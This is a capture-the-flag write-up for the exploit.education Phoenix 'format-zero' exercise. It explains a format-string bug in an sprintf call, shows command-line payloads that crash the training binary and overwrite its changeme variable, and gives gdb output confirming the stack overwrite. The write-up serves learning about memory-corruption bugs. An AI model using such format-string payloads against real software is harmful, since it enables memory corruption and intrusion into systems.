Write-up for: [Format Zero](https://exploit.education/phoenix/format-zero/)

<!--more-->

The goal is to change the changeme variable of the `locals` struct. Data is read
from stdin to the local `buffer` array. It is properly bounds checked and null-terminated.
Then, data from the `buffer` variable is written to `locals.dest` using `sprintf`.

We can confirm that the read is properly bounds-checked:

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c 'print "A"*33' | ./format-zero
Welcome to phoenix/format-zero, brought to you by https://exploit.education
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```

# The bug

The usage of sprintf is incorrect:

```C
sprintf(locals.dest, buffer);
```

This call does not make use of format strings (`sprintf(dest, "%s", buffer);`) but directly
uses user input as the format string. Thus, as an attacker, we can provide a string as input
containing format specifiers.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c 'print "%s"*16' | ./format-zero
Welcome to phoenix/format-zero, brought to you by https://exploit.education
Segmentation fault
```

Depending on the format string, this can lead to a crash. Or, in another case:

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c 'print "%x"*8' | ./format-zero
Welcome to phoenix/format-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

What happened here?

# Analysis

The length of the user provided buffer does not matter since we can use format string modifiers to
define the length of what is written by `sprintf`. By doing so, we can have user input shorter that 15 characters
but overflow the `dest` buffer by generating a longer string.

To precisely overwrite `changeme` we need our string to have 32 characters of padding and then a 4-byte value 
we want changeme to be.

Let's confirm this theory with gdb. First we need to find out where changeme is stored:

```bash
0x08048584 <+79>:    mov    DWORD PTR [ebp-0xc],0x0
```

This instruction sets `changeme` to zero. It is located at `ebp-0xc = 0xffffd5ec`. Let's run 
with our payload and look at that word on the stack:

```bash
(gdb) run < <(python -c 'print "%32xAAAA"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/phoenix/i486/format-zero < <(python -c 'print "%32xAAAA"')

(gdb) x/xw $ebp-0xc
0xffffd5ec:     0x41414141
```

There are our A's. Done :).
